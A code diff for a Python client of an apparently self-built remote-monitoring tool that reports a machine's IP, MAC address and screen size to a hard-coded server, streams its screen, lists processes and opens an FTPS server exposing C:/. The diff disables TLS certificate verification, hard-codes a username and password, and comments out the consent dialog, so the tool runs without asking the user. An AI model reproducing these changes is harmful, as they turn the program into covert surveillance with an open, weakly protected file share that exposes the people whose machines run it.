@@ -15,6 +15,7 @@ import threading
 import os
 from pyftpdlib.servers import FTPServer
 from pyftpdlib.authorizers import WindowsAuthorizer
+from pyftpdlib.authorizers import DummyAuthorizer
 import pyftpdlib.handlers
 from OpenSSL import SSL
 import re
@@ -27,7 +28,7 @@ from pystray import MenuItem, Menu
 from PIL import Image
 
 
-HOST = "192.168.2.75"  # The server's hostname or IP address
+HOST = "192.168.1.173"  # The server's hostname or IP address
 PORT = 65432  # The port used by the server
 
 result = ""
@@ -57,24 +58,31 @@ def start_listening_for_commands(running_port):
 
 
 def send_computer_information(running_port):
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    context.load_verify_locations('../certificates2/server.crt')
+    #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    #context.load_verify_locations('../certificates2/server.crt')
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         # with context.wrap_socket(sock, server_hostname="HOST") as ssock:
-        ssl_sock = ssl.wrap_socket(sock,
+        """ssl_sock = ssl.wrap_socket(sock,
                                    ca_certs="../certificates2/server.crt",
-                                   cert_reqs=ssl.CERT_REQUIRED)
-        # print(ssock.version())
+                                   cert_reqs=ssl.CERT_REQUIRED)"""
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
+
+        ssl_sock = context.wrap_socket(sock, server_hostname=HOST)
         ssl_sock.connect((HOST, PORT))
-        # sock.connect((HOST, PORT))
-        # hostname = socket.getfqdn()
-        # Wait to see if workes with outside lan connection
-        # ip_address = socket.gethostbyname(hostname)
+        print("connected")
         ip_address = return_ip_address()
+        print(ip_address)
         mac_address = gma()
+        print(mac_address)
         width, height = get_screen_width_height()
+        print(width, height)
         data_to_send = [ip_address, str(running_port), mac_address, str(width), str(height)]
+        print(data_to_send)
         encoded_data = '||'.join(data_to_send).encode()
         ssl_sock.sendall(encoded_data)
         ssl_sock.close()
@@ -96,7 +104,7 @@ def retreive_screen(conn, width, height):
     with mss() as mss_instance:
         recording_area = {'top': 0, 'left': 0, 'width': width, 'height': height}
         # Retrieve monitor instead of a specific area
-        monitor_1 = mss_instance.monitors[1]
+        monitor_1 = mss_instance.monitors[2]
 
         while "recording":
             # Grab the screen with the dimensions of the recording_area
@@ -245,10 +253,12 @@ def process_list_service(host, port):
             conn.close()
 
 
-def sftp_server_start(conn, ipaddress, port):
-    ## Create DummyUsers to not use windowsAuth
-    authorizer = WindowsAuthorizer(allowed_users=["Shw"])
-    authorizer.override_user("Shw", homedir='C:/', perm="elradfmw")
+def ftps_server_start(conn, ipaddress, port):
+    authorizer = DummyAuthorizer()
+    authorizer.add_user("Shw", "Pracc999.", "C:/", perm="elradfmw")
+    #authorizer.remove_user("anonymous")
+    #authorizer = WindowsAuthorizer(allowed_users=["Shw"])
+    #authorizer.override_user("Shw", homedir='C:/', perm="elradfmw")
     handler = pyftpdlib.handlers.TLS_FTPHandler
     handler.certfile = 'keycert.pem'
     handler.authorizer = authorizer
@@ -317,10 +327,10 @@ def handle_connections_for_functionalities(host, port):
 
                     conn.sendall(process_list.encode())
 
-                elif data.decode() == "sftp_server":
+                elif data.decode() == "ftps_server":
                     try:
 
-                        thread = Thread(target=sftp_server_start(conn, host, "2221"))
+                        thread = Thread(target=ftps_server_start(conn, host, "2221"))
                         thread.start()
                         thread.join()
                     except Exception as e:
@@ -330,7 +340,7 @@ def handle_connections_for_functionalities(host, port):
             print("")
 
         finally:
-            print("asdad")
+            print("disconnected")
             #conn.close()
 
 
@@ -351,8 +361,8 @@ def policies_handle_data():
 
         else:
             mb.showinfo('Refused', 'Without accepting the consent policies it is not possible to use the program')
-            root.destroy()
-            exit()
+            os._exit(1)
+
 
     root = tk.Tk()
     root.option_add('*Dialog.msg.font', 'Helvetica 24')
@@ -401,8 +411,7 @@ def main():
     icon_manager = threading.Thread(target=StrayIcon)
     icon_manager.start()
     running_port = return_not_used_port()
-    #running_port = 6666
-    policies_handle_data()
+    #policies_handle_data()
     send_computer_information(running_port)
     ip_address = return_ip_address()
     handle_connections_for_functionalities(ip_address, running_port)
